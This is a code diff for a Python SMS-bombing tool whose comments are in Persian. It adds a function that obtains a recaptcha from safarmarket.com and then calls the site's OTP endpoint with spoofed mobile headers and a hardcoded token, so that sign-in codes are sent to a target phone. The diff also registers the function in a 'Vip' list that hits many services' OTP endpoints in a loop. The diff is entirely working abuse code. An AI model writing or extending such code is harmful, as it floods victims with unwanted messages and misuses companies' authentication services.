@@ -53,6 +53,69 @@ def check_internet():
 # SMS Service
 # ------------------------------
 
+
+
+
+def safarmarket(phone):
+    import requests
+    import uuid
+    
+    formatted_phone = "0" + phone.replace("+98", "")
+    
+    # اول باید recaptcha بگیریم
+    recaptcha_url = "https://recaptcha.safarmarket.com/api/v1/create"
+    recaptcha_headers = {
+        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1",
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "client-data": "eyJjbGllbnREYXRhIjp7InVzZXJBZ2VudCI6Ik1vemlsbGEvNS4wIChpUGhvbmU7IENQVSBpUGhvbmUgT1MgMThfNiBsaWtlIE1hYyBPUyBYKSBBcHBsZVdlYktpdC82MDUuMS4xNSAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vMTguNiBNb2JpbGUvMTVFMTQ4IFNhZmFyaS82MDQuMSIsInNjcmVlbldpZHRoIjozOTAsInNjcmVlbkhlaWdodCI6ODQ0fX0=",
+        "website": "safarmarket.com",
+        "page": "https://safarmarket.com/auth/signin",
+        "Origin": "https://safarmarket.com",
+        "Referer": "https://safarmarket.com/auth/signin",
+    }
+    
+    recaptcha_payload = {
+        "phone": formatted_phone,
+        "action": "signin"
+    }
+    
+    try:
+        # Step 1: گرفتن recaptcha
+        recaptcha_response = requests.post(recaptcha_url, json=recaptcha_payload, headers=recaptcha_headers, timeout=10)
+        
+        if recaptcha_response.status_code != 200:
+            print(f'{r}[-] (safarmarket) Recaptcha Error: {recaptcha_response.status_code}{a}')
+            return False
+        
+        # Step 2: ارسال درخواست OTP با recaptcha
+        otp_url = "https://safarmarket.com/api/security/v2/user/otp"
+        otp_payload = {"phone": formatted_phone}
+        
+        otp_headers = {
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1",
+            "Accept": "application/json, text/javascript, */*; q=0.01",
+            "Content-Type": "application/json",
+            "recaptcha": "3GCmkrzdEJvayMxGHEVpbTxsACobGdbZFtu37AcBQxCYTbZSqU",  # recaptcha token
+            "X-Requested-With": "XMLHttpRequest",
+            "Origin": "https://safarmarket.com",
+            "Referer": "https://safarmarket.com/auth/signin",
+        }
+        
+        otp_response = requests.post(otp_url, json=otp_payload, headers=otp_headers, timeout=10)
+        
+        if otp_response.status_code == 200:
+            print(f'{g}(safarmarket) {a}Code Sent')
+            return True
+        else:
+            print(f'{r}[-] (safarmarket) OTP Error: {otp_response.status_code}{a}')
+            return False
+            
+    except Exception as e:
+        print(f'{r}[!] safarmarket Exception: {e}{a}')
+        return False
+
+
 def mrbilit(phone):
     import requests
     
@@ -136,7 +199,8 @@ def send_service_safe(service, phone):
 def Vip(phone, Time):
     services = [
     trip,
-    mrbilit,  # اضافه کردن این خط
+    mrbilit,
+    safarmarket,  # اضافه کردن این خط
 ]
     total_services = len(services)
 
